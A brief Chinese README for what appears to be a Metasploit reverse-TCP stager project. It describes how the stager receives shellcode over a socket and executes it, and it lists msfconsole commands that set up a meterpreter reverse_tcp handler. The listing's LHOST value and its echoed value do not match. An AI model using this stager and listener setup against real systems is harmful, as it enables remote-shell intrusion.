# msf_reverse_tcp_stager
反向tcp连接的stager的实现


![在这里插入图片描述](https://img-blog.csdnimg.cn/20200819140259747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODc0OTMw,size_16,color_FFFFFF,t_70#pic_center)

# 编写原理

先接收4个字节的数据，这个数据为shellcode的总字节数。
分配内存，设置缓冲区到第一个数据为0xBF。
将socket连接到句柄传到缓冲区中。
然后接收剩余数据。
以缓冲区的基地址为起点开始执行shellcode。

[metasploit payload运行原理](https://www.cnblogs.com/Akkuman/p/12859091.html)


# 在msf上需要进行的操作参考


```
msf > use exploit/multi/handler 
msf  exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf  exploit(handler) > set LPORT 4444
LPORT => 4444
msf  exploit(handler) > set LHOST 192.168.0.1
LHOST => 192.168.95.241
msf  exploit(handler) > run
```
